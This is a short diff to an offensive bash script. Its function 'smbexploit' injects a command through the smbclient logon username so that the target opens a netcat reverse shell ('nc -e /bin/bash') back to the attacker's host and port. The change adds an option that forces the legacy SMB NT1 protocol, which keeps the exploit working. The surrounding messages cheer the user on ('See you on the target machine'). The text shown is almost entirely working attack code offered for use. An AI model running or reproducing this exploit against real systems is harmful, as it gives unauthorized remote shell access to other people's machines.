@@ -75,7 +75,7 @@ function smbexploit(){
 	echo -e "\n${yellowColour} If you have already done ... Good Luck :) ${endColour}"; sleep 1
 	echo -e "\n${yellowColour} IMPORTANT!! When the prompt give you the option to put a password, just hit te enter key... See you on the target machine <3 ${endColour}\n\n"; sleep 5
 	tput cnorm
-	echo ''; bash -c "smbclient //$remote_machine/$folder -N -c 'logon \"/=\`nohup nc -e /bin/bash $local_host $local_port\`\"'"
+	echo ''; bash -c "smbclient //$remote_machine/$folder -N --option="client min protocol=NT1" -c 'logon \"/=\`nohup nc -e /bin/bash $local_host $local_port\`\"'"
 
 }
 
